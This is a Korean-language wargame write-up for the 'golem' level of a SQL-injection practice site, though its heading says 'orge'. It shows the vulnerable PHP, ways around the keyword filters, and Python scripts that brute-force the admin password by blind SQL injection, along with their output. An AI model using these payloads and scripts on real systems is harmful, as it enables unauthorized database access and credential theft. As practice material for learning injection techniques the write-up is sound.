# orge

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- `or`, `and`, `substr(`, `=`을 필터링 한다.
- admin의 정확한 pw를 알아야 한다.

## 3. Solution
python 스크립트를 이용해 blind-sqlinjection 한다.

a. pw의 길이
b. pw의 값


### a. Length of pw
변수명 | 값
---|---:
`pw` | 1234' || id like 'admin' && length(pw) like `i` #


필터링 중인 연산자는 기호로 우회하였다.
'Hello admin'을 찾아가며 논리식을 검증한다.


이후, 비교값 `i`는 반복문을 통해 적당값(ex. 1~20)을 넣어준다.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?\
            pw=1234' || id like 'admin' %%26%%26 length(pw) like %d %%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
```
---


### b. Value of pw

변수명 | 값
---|---:
`pw` | 1234' || id like 'admin' && ascii(mid(pw,i,1)) like j #


a. Length of pw 의 코드에 추가해 보자.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?\
            pw=1234' || id like 'admin' %%26%%26 length(pw) like %d %%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break

pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?\
                pw=1234' || id like 'admin' %%26%%26 ascii(mid(pw,%d,1)) like %d %%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
pw(1) : 7
pw(2) : 77
pw(3) : 77d
pw(4) : 77d6
pw(5) : 77d62
pw(6) : 77d629
pw(7) : 77d6290
pw(8) : 77d6290b
```
---



나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.

변수명 | 값
---|---:
`pw` | 77d6290b